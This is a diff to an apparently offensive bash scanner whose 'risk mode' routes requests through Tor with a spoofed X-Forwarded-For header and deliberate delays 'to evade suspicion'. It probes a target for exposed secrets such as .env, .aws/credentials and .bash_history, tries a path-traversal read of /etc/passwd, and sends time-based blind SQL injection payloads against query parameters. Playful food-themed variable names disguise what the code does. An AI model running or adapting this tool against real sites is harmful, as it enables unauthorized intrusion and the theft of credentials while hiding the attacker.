@@ -1,85 +1,88 @@
-   echo ""
-    echo -e "\e[0;33m[\e[0m!\e[0;33m]\e[0m You just toggle on risk mode.. So, as i promise, RISK MODE ACTIVE."
+echo ""
+echo -e "\e[0;33m[\e[0m!\e[0;33m]\e[0m You just toggle on risk mode.. So, as i promise, RISK MODE ACTIVE."
+echo ""
+sleep 3
+
+Chicken() {
+    local crispy_thigh="$1"
+    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $target_url/$crispy_thigh ( Mode RISK )"
+    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$target_url/$crispy_thigh" --stderr - | grep "< HTTP"
+    sleep $((2 + RANDOM % 3))
+}
+
+time_audit_engine() {
+    local extra_spicy_sauce="$1"
+    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Auditing Latency: $target_url$extra_spicy_sauce"
+    local secret_msg_powder="${extra_spicy_sauce}Sleep(5)))v)--+"
+    local stopwatch_seconds=$(curl --socks5-hostname 127.0.0.1:9050 -m 12 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$secret_msg_powder")
+    echo -e "    -> Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
+    if (( $(echo "$stopwatch_seconds > 5.0" | bc -l) )); then
+        local warm_rice_bowl="${extra_spicy_sauce}Sleep(2)))v)--+"
+        local wash_hands_now=$(curl --socks5-hostname 127.0.0.1:9050 -m 8 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$warm_rice_bowl")
+        if (( $(echo "$wash_hands_now > 2.0" | bc -l) )) && (( $(echo "$wash_hands_now < 4.0" | bc -l) )); then
+            echo -e "    -> Time-Delay Matrix: First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
+            echo -e "    \e[0;31m[!+!] ALERT: 'Confirmed' Genuine Time Based Vulnerability!\e[0m"
+        else
+            echo -e "    -> Time-Delay Matrix: First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
+            echo -e "    \e[0;33m[-] Status: False postive, neither network lag or server defense mechanism detected.\e[0m"
+        fi
+    else
+        echo -e "    -> Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
+        echo -e "    \e[0;37m[-] Status: Safe, normal server response time.\e[0m"
+    fi
     echo ""
-    sleep 3
+}
 
-    risk_file_01="$target_url//.env%00"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_01 ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_01" --stderr - | grep "< HTTP"
-    sleep $((2 + RANDOM % 3))
+gentle_probe_engine() {
+    local fresh_salad="$1"
+    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Deploying Gentle Probing Matrix on: $target_url/$fresh_salad"
+    local restaurant_cashier=$(curl --socks5-hostname 127.0.0.1:9050 -m 5 -X OPTIONS -A "Mozilla/5.0" -s -Iv "$target_url/$fresh_salad" --stderr - | grep -Ei "< (Allow|Server|X-Powered-By)")
+    if [ -n "$restaurant_cashier" ]; then
+        echo -e "$restaurant_cashier" | sed 's/^/    -> /'
+    else
+        echo -e "    -> Status: No explicit server footprint returned."
+    fi
+    echo ""
+}
 
-    risk_file_02="$target_url/../../../../../../etc/passwd"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_02 ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_02" --stderr - | grep "< HTTP"
-    sleep $((2 + RANDOM % 3))
+Chicken ".env%00"
+Chicken "../../../../../../etc/passwd"
+Chicken "phpmyadmin/config.inc.php"
+Chicken ".mysql_history"
+Chicken "config/jwt.txt"
+Chicken ".env.bak"
 
-    risk_file_03="$target_url/phpmyadmin/config.inc.php"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_03 ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_03" --stderr - | grep "< HTTP"
-    sleep $((2 + RANDOM % 3))
+echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Sleeping for 5 seconds to evade suspicion"
+sleep 5
 
-    risk_file_04="$target_url/.mysql_history"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_04 ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_04" --stderr - | grep "< HTTP"
-    sleep $((2 + RANDOM % 3))
+Chicken ".aws/credentials"
+Chicken ".bash_history"
+Chicken "config/database.yml"
+Chicken "amplify/.config/local-env-info.json"
 
-    risk_file_05="$target_url/config/jwt.txt"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_05 ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_05" --stderr - | grep "< HTTP"
-    sleep $((2 + RANDOM % 3))
+echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Sleeping for 5 seconds to evade suspicion"
+sleep 5
 
-    risk_file_06="$target_url/.env.bak"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_06 ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_06" --stderr - | grep "< HTTP"
+Chicken "error_log"
+Chicken "storage/logs/laravel.log"
+Chicken "debug.log"
+Chicken ".git/logs/HEAD"
+Chicken ".idea/workspace.xml"
 
-    echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Sleeping for 5 seconds to evade suspicion"
-    sleep 5
+echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Sleeping for 5 seconds to evade suspicion"
+sleep 5
 
-    risk_file_07="$target_url/.aws/credentials"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_07 ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_07" --stderr - | grep "< HTTP"
-    sleep $((2 + RANDOM % 3))
+time_audit_engine "/index.php?id=1'And(Select*From(Select("
+sleep $((2 + RANDOM % 3))
 
-    risk_file_08="$target_url/.bash_history"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_08 ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_08" --stderr - | grep "< HTTP"
-    sleep $((2 + RANDOM % 3))
+time_audit_engine "/api/users?search=test'And(Select*From(Select("
+sleep $((2 + RANDOM % 3))
 
-    risk_file_09="$target_url/config/database.yml"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_09 ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_09" --stderr - | grep "< HTTP"
-    sleep $((2 + RANDOM % 3))
+gentle_probe_engine ".env"
+sleep $((1 + RANDOM % 3))
 
-    risk_file_10="$target_url/amplify/.config/local-env-info.json"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_10 ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_10" --stderr - | grep "< HTTP"
+gentle_probe_engine "wp-config.php"
+sleep $((1 + RANDOM % 3))
 
-    echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Sleeping for 5 seconds to evade suspicion"
-    sleep 5
-
-    risk_file_11="$target_url/error_log"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_11 ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_11" --stderr - | grep "< HTTP"
-    sleep $((2 + RANDOM % 3))
-
-    risk_file_12="$target_url/storage/logs/laravel.log"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_12 ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_12" --stderr - | grep "< HTTP"
-    sleep $((2 + RANDOM % 3))
-
-    risk_file_13="$target_url/debug.log"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_13 ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_13" --stderr - | grep "< HTTP"
-    sleep $((2 + RANDOM % 3))
-
-    risk_file_14="$target_url/.git/logs/HEAD"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_14 ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_14" --stderr - | grep "< HTTP"
-    sleep $((2 + RANDOM % 3))
-
-    risk_file_15="$target_url/.idea/workspace.xml"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_15 ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_15" --stderr - | grep "< HTTP"
-
-    echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Take your sleep man, for only 5 seconds."
-    sleep 5
+echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Take your sleep man, for only 5 seconds."
+sleep 5
